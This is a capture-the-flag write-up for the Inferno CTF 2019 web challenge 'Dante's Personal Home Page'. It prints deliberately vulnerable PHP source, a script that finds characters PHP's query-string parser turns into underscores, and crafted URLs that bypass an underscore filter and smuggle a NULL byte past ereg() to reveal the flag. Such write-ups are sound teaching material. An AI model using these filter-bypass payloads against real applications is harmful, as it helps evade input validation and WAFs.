# Inferno CTF 2019 – Dante's Personal Home Page

* **Category:** Web
* **Points:** 180

## Challenge

> Dante has used some PHP on his site but it only allows magicians to enter. Show him your magical skills!!
> 
> http://104.197.168.32:17011/
> 
> Author : MrT4ntr4

## Solution

The website will show its own source code.

```php
<?php
include("flag.php");

if (isset ($_GET['__magic__'])) {
    $magic = $_GET['__magic__'];

    $check = urldecode($_SERVER['QUERY_STRING']); 

    if(preg_match("/_| /i", $check)) 
    { 
        die("Get yourself some coffee"); 
    } 

    if (ereg ("^[a-zA-Z0-9]+$", $magic) === FALSE)
        echo 'Only Alphanumeric accepted';
    else if (strpos ($magic, '$dark$') !== FALSE)
    {
        if (!is_array($magic)){
            echo "Congratulations! FLAG is : ".$flag;
        }
        else{
            die("You darn!!");
        }
    }
    else
        {
            die("Your magic doesn't work on me");
        }
} else {
  show_source(__FILE__);
}
?>
```

There are a couple of checks that must be bypassed to get the flag.

The first part is the following.

```php
if (isset ($_GET['__magic__'])) {
    $magic = $_GET['__magic__'];

    $check = urldecode($_SERVER['QUERY_STRING']); 

    if(preg_match("/_| /i", $check)) 
    { 
        die("Get yourself some coffee"); 
    } 
```

This check is pretty weird, because to bypass it you have to provide a GET parameter with underscores, but having a query string without underscores. So, yeah, there is a bit of magic, here...

According to [this website](https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/), PHP performs some string manipulation on input parameters' names in order to remove, for example, whitespaces and to convert characters in underscores.

This behavior can be abused crafting a string with chars that are converted to underscores, but they are not.

You can write a simple script to enumerate these chars.

```php
<?php

foreach(
        [
            "{chr}{chr}magic__",
            "__magic{chr}{chr}"
        ] as $k => $arg) {
            for($i=0;$i<=255;$i++) {
                echo "\033[999D\033[K\r";
                echo "[".$arg."] check ".bin2hex(chr($i))."";
                parse_str(str_replace("{chr}",chr($i),$arg)."=bla",$o);

                if(isset($o["__magic__"])) {
                    echo "\033[999D\033[K\r";
                    echo $arg." -> ".bin2hex(chr($i))." (".chr($i).")\n";
                }
            }
            echo "\033[999D\033[K\r";

            echo "\n";
    }
```

The output of the script is the following.

```  
{chr}{chr}magic__ -> 2e (.)
{chr}{chr}magic__ -> 5f (_)

__magic{chr}{chr} -> 20 ( )
__magic{chr}{chr} -> 2b (+)
__magic{chr}{chr} -> 2e (.)
__magic{chr}{chr} -> 5f (_)
```

So you can use the `.` char to craft the URL.

```
http://104.197.168.32:17011/?..magic..=foo
```

The website will answer the following.

```
Your magic doesn't work on me
```

At this point, the other check to bypass is the following.

```php
    if (ereg ("^[a-zA-Z0-9]+$", $magic) === FALSE)
        echo 'Only Alphanumeric accepted';
    else if (strpos ($magic, '$dark$') !== FALSE)
    {
        if (!is_array($magic)){
            echo "Congratulations! FLAG is : ".$flag;
```

So you can insert only alphanumeric chars, but you have to insert two `$` chars.

According to [this website](https://bugs.php.net/bug.php?id=44366), you can bypass the `ereg` instruction injecting a NULL byte. The result is a string that is correctly interpreted by `strpos` and, obviously, is not an array.

The final URL is the following.

```
http://104.197.168.32:17011/?..magic..=foo%00$dark$
```

The website will print the flag.

```
Congratulations! FLAG is : infernoCTF{1_gu3ss_y0ur_m4g1c_was_w4y_t00_d4rk}
```